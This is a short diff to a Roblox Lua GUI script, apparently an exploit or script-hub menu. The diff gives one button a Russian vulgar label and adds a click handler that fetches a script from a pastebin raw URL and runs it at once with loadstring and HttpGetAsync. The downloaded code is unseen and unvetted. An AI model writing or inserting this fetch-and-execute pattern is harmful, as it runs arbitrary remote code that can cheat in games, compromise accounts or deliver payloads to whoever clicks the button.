@@ -143,6 +143,11 @@ fourfour.Size = UDim2.new(0, 149, 0, 19)
 fourfour.Font = Enum.Font.SourceSans
 fourfour.TextColor3 = Color3.fromRGB(0, 0, 0)
 fourfour.TextSize = 14.000
+thrthr.Text = "Fonar' ebat'"
+fourfour.MouseButton1Down:connect(function()
+         loadstring(game:HttpGetAsync("https://pastebin.com/raw/9BBKhHn4"))()
+end)
+
 
 thrthr.Name = "thrthr"
 thrthr.Parent = menu
